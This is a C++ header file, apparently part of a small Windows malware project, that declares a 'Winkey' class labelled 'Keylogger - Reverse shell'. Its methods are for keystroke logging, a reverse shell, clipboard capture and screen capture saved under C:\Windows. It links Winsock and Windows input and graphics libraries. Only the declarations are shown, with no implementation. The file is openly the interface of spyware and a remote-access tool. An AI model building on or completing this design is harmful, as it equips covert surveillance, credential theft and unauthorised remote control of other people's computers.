#ifndef WINKEY_HPP
# define WINKEY_HPP

# include <iostream>  // For standard I/O
# include <winsock2.h> // For Winsock functions
# include <windows.h>  // For Windows API functions
# include <Tlhelp32.h>
# include <time.h>
# include <unordered_map>
# include <cctype> // Include for std::toupper
# include <wingdi.h>
# include <winuser.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")


# define SCREEN_PATH TEXT(L"C:\\Windows\\save.png")


// Keylogger - Reverse shell
class Winkey {
	public:
		Winkey(void);
		~Winkey(void);


		void	startKeylogger();
		void	startReverseShell();
		void	startclipBoard(void);
		void	startCaptureScreen(void);
		//DWORD WINAPI _reverseShell(LPVOID lpParam);
	private:
		
};

#endif